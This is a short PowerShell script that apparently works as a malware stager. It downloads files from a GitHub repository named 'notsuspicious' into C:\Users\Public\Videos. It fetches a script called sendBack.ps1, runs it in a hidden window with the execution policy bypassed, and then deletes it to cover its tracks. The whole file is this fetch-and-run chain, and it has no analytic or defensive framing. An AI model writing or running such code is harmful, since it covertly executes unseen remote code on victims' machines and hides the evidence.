try {
    # Download url.txt
    Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
    
    # Download and execute sendBack.ps1
    $ps1Content = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
    $ps1Content | Out-File -FilePath "C:\Users\Public\Videos\sendBack.ps1" -Encoding UTF8
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Users\Public\Videos\sendBack.ps1" -WindowStyle Hidden -Wait
}
catch {
    # Handle exceptions here
    Write-Host "An error occurred: $_"
}
finally {
    # Delete the ps1 file after execution
    Remove-Item -Path "C:\Users\Public\Videos\sendBack.ps1" -Force
}
